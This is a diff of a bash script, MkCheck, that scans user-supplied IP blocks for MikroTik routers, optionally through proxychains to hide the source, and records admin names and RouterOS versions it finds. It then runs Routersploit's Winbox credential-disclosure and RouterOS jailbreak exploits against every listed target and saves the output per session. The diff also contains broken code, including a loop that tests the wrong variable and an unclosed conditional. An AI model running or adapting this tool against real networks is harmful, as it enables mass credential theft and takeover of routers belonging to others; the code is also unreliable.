@@ -14,7 +14,7 @@ UPURPLE='\033[4;35m'
 UBLUE='\033[4;34m'
 URED='\033[4;31m'
 
-#trap "trap_ctrlc" 2
+trap "trap_ctrlc" 2
 sudo chown $USER:$USER -R /opt/MkCheck
 cd /opt/MkCheck
 # Root Check
@@ -22,21 +22,24 @@ if [[ $EUID -ne 0 ]]; then
    echo "This script must be run as root" 
    exit 1
 fi
-# First check to see if tiks.txt has data
-RE=$(cat /opt/MkCheck/files/tiks.txt)
-if [[ ${RE} == "" ]]; then
-	echo -e "${URED}Please enter an IP block to start scanning first${NC}"
-	sudo nano /opt/MkCheck/files/tiks.txt
-fi
-# Second check to see if data is example data
-RR=$(cat /opt/MkCheck/files/tiks.txt | grep "# NOTE THIS IP BLOCK DOES NOT CONTAIN MIKROTIK ROUTERS")
-if [[ ${RR} == "# NOTE THIS IP BLOCK DOES NOT CONTAIN MIKROTIK ROUTERS" ]]; then
-	sudo rm /opt/MkCheck/files/tiks.txt
-	echo -e "${URED}Please enter an IP block to start scanning first${NC}"
-	nano /opt/MkCheck/files/tiks.txt
+if [[ ! -f '.conf' ]]; then
+	# First check to see if tiks.txt has data
+	RE=$(cat /opt/MkCheck/files/tiks.txt)
+	if [[ ${RE} == "" ]]; then
+		echo -e "${URED}Please enter an IP block to start scanning first${NC}"
+		sudo nano /opt/MkCheck/files/tiks.txt
+	fi
+	# Second check to see if data is example data
+	RR=$(cat /opt/MkCheck/files/tiks.txt | grep "# NOTE THIS IP BLOCK DOES NOT CONTAIN MIKROTIK ROUTERS")
+	if [[ ${RR} == "# NOTE THIS IP BLOCK DOES NOT CONTAIN MIKROTIK ROUTERS" ]]; then
+		sudo rm /opt/MkCheck/files/tiks.txt
+		echo -e "${URED}Please enter an IP block to start scanning first${NC}"
+		nano /opt/MkCheck/files/tiks.txt
 else
 	# Check to see if user will keep original data or replace
-	echo -e "${W}Would you like to ${URED}k${NC}${W}eep previous target files or start ${URED}f${NC}${W}resh?${YLW}(k/f)${NC}"
+	SESH=$(cat .conf)
+	echo -e "${W}Previous Session: ${SESH}"
+	echo -e "${W}Would you like to ${URED}k${NC}${W}eep previous session or start ${URED}f${NC}${W}resh?${YLW}(k/f)${NC}"
 	read CONF
 	if [[ ${CONF} == "f" ]]; then
 		sudo rm files/tiks.txt files/tiks_res.txt tiks_rsf.txt
@@ -44,8 +47,8 @@ else
 		sleep 2
 		nano files/tiks.txt
 	else
-		if [[ -f 'files/session_*' ]]; then
-			sudo cp files/session_* files/tiks.txt
+		if [[ -f 'files/.${SESH}_tiks.txt' ]]; then
+			sudo cp files/.${SESH}_tiks.txt files/tiks.txt
 		fi
 	fi
 fi
@@ -82,32 +85,31 @@ if [[ ! -d '/opt/MkCheck/results/Vulns' ]]; then
 	mkdir /opt/MkCheck/results/Vulns
 fi
 # Final Results Correlation for Net AP Name 
-apresults(){
-	for log in `cat /opt/MkCheck/files/tiks_res.txt`
-		do
-			echo "${log}"
-			echo "${log}" >> results/Vulns/${SESSION}_final.result
-			cat results/Vulns/${log}.results
-			cat results/Vulns/${log}.results >> results/Vulns/${SESSION}_final.result
-			echo "==========================================================================="
-			echo "===========================================================================" >> results/Vulns/${SESSION}_final.result
-		done
-	sudo mv results/Vulns/*.results -t results/Vulns/${SESSION}
-}
+#apresults(){
+#	for log in `cat /opt/MkCheck/files/tiks_res.txt`
+#			echo "${log}"
+#			echo "${log}" >> results/Vulns/${SESSION}_final.result
+#			cat results/Vulns/${log}.results
+#			cat results/Vulns/${log}.results >> results/Vulns/${SESSION}_final.result
+#			echo "==========================================================================="
+#			echo "===========================================================================" >> results/Vulns/${SESSION}_final.result
+#		done
+#	sudo mv results/Vulns/*.results -t results/Vulns/${SESSION}
+#}
 # Jailbreak Result Correlation
-rsfresults(){
-	for log in `cat /opt/MkCheck/files/tiks_res.txt`
-		do
-			echo "${log}"
-			echo "${log}" >> results/RSF/${SESSION}_final.result
-			cat results/RSF/${log}.results
-			cat results/RSF/${log}.results >> results/RSF/${SESSION}_final.result
-			echo "==========================================================================="
-			echo "===========================================================================" >> results/RSF/${SESSION}_final.result
-			sleep 2
-		done
-	sudo mv results/RSF/*.results -t results/RSF/${SESSION}
-}
+#rsfresults(){
+#	for log in `cat /opt/MkCheck/files/tiks_res.txt`
+#		do
+#			echo "${log}"
+#			echo "${log}" >> results/RSF/${SESSION}_final.result
+#			cat results/RSF/${log}.results
+#			cat results/RSF/${log}.results >> results/RSF/${SESSION}_final.result
+#			echo "==========================================================================="
+#			echo "===========================================================================" >> results/RSF/${SESSION}_final.result
+#			sleep 2
+#		done
+#	sudo mv results/RSF/*.results -t results/RSF/${SESSION}
+#}
 # New Target Thread for MCheck
 target(){
 	RARG=$(python3 scripts/get_t.py)
@@ -134,28 +136,10 @@ trap_ctrlc (){
 		return
 	fi
 }
-ap_check(){
-	if [[ -f '/opt/MkCheck/results/Vulns/*.255.results' ]]; then
-		kill $!
-		apresults
-		main
-	else
-		return
-	fi
-}
-rsf_check(){
-	if [[ -f '/opt/MkCheck/results/RSF/*.255.results' ]]; then
-		kill $!
-		rsfresults
-		main
-	else
-		return
-	fi
-}
 # Mikro Network AP Name Check (No Proxy)
 mchecker(){
-	while :
-	do
+	Z=0
+	while [[ $Y -lt 255 ]]; do
 		echo -e "${RED}Press <CTRL+C> to exit.${NC}"
 		target
 		echo ""
@@ -164,11 +148,37 @@ mchecker(){
 		python scripts/miko.py | tee output.log
 		NAME=$(cat output.log | grep 'admin@')
 		VER=$(cat output.log | grep 'MikroTik RouterOS')
+		echo "${NAME}" >> results/Vulns/${SESSION}/${VAR}.results
+		echo "${VER}" >> results/Vulns/${SESSION}/${VAR}.results
+		echo "==============================================================================================" >> results/Vulns/${SESSION}/${VAR}.results
+		sudo rm output.log
+		FINAL=$(cat results/Vulns/${SESSION}/${VAR}.results)
+		echo ${FINAL} >> results/Vulns/${SESSION}/final.results
+		Z=$(( $Z + 1 ))
+	done
+}
+# Network AP Discovery (with Proxy)
+pchecker(){
+	Z=0
+	while [[ $Z -lt 255 ]];	do
+		echo -e "${RED}Press <CTRL+C> to exit.${NC}"
+		target
+		echo ""
+		running
+		echo ""
+		proxychains4 python scripts/miko.py | tee output.log
+		NAME=$(cat output.log | grep 'admin@')
+		VER=$(cat output.log | grep 'MikroTik RouterOS')
 		echo "${NAME}" >> results/Vulns/${VAR}.results
 		echo "${VER}" >> results/Vulns/${VAR}.results
 		echo "==============================================================================================" 
+		echo "${NAME}" >> results/Vulns/${SESSION}/${VAR}.results
+		echo "${VER}" >> results/Vulns/${SESSION}/${VAR}.results
+		echo "==============================================================================================" >> results/Vulns/${SESSION}/${VAR}.results
 		sudo rm output.log
-		ap_check
+		FINAL=$(cat results/Vulns/${SESSION}/${VAR}.results)
+		echo ${FINAL} >> results/Vulns/${SESSION}/final.results
+		Z=$(( $Z + 1 ))
 	done
 }
 # Routersploit Vuln Check
@@ -178,13 +188,14 @@ rtsploit(){
 		do
 			#winbox_auth_bypass_creds_disclosure
 			WINSAVE=$(sudo python3.7 rsf.py -m exploits/routers/mikrotik/winbox_auth_bypass_creds_disclosure -s "target ${name}")
-			echo "${WINSAVE}" >> /opt/MkCheck/results/RSF/${name}.results
-			echo "${WINSAVE}"
+			echo "${WINSAVE}" >> /opt/MkCheck/results/RSF/${SESSION}/${name}.results
+			echo "${WINSAVE}" >> /opt/MkCheck/results/RSF/${SESSION}/final.results
 			# routeros_jailbreak
 			JAIL=$(sudo python3 rsf.py -m exploits/routers/mikrotik/routeros_jailbreak -s "target ${name}")
-			echo "${JAIL}" >> /opt/MkCheck/results/RSF/${name}.results
+			echo "${JAIL}" >> /opt/MkCheck/results/RSF/${SESSION}/${name}.results
+			echo "${JAIL}" >> /opt/MkCheck/results/RSF/${SESSION}/final.results
 			echo "${JAIL}"
-			rsf_check
+			echo "================================================================================================" >> /opt/MkCheck/results/RSF/${SESSION}/final.results
 		done
 }
 # Update Args
@@ -240,7 +251,7 @@ update(){
 	fi
   echo -e "${NC}"
 }
-#MCheck Start
+# MkCheck Start
 main(){
 	# initialise trap to call trap_ctrlc function
 	# when signal 2 (SIGINT) is received
@@ -249,7 +260,7 @@ main(){
 	echo -e "${NC}"
 #	echo -e "${W}Hit ${UBLUE}Ctrl + z${NC} ${W}to exit completely or ${UBLUE}Ctrl + c${NC} ${W}to quit a scan${NC}"
 	PS3='What tool would you like to use?'
-		options=("MikroTik Auto-EX" "Routersploit Vuln Check" "Sort Results" "Update")
+		options=("MikroTik Auto-EX" "Routersploit Vuln Check" "Update") #"Sort Results" 
 		select opt in "${options[@]}"
 			do
 				case $opt in
@@ -257,8 +268,7 @@ main(){
 						echo -e "${W}Would you like to run MCheck using a proxy?${YLW}(y/n)${NC}"
 						read PROXY 
 						if [[ ${PROXY} == "y" ]]; then
-							sudo service tor start
-							proxychains4 mchecker
+							pchecker
 						else
 							mchecker
 						fi
@@ -268,18 +278,12 @@ main(){
 						rtsploit
 						;;
 
-					"Sort Results")
-						apresults
-						rsfresults
-						;;
-
 					"Update")
 						update
 						;;
 
 				esac
 			done
-		echo -e "${YLW}All results have been saved to ${UPURPLE}/opt/MkCheck/files/${NC}"
 }
 cd /opt/MkCheck
 
@@ -288,8 +292,9 @@ figlet MkCheck
 echo -e "${NC}"
 echo -e "${W}Please enter a name for this session${NC}"
 read SESSION
+echo ${SESSION} >> .conf
 echo -e "${YLW}Backup of this sessions Target file saved as ${UBLUE}session_${SESSION}.txt${NC}"
-cp files/tiks.txt files/session_${SESSION}.txt
+cp files/tiks.txt files/.${SESSION}_tiks.txt
 mkdir results/Vulns/${SESSION}
 mkdir results/RSF/${SESSION}
 main
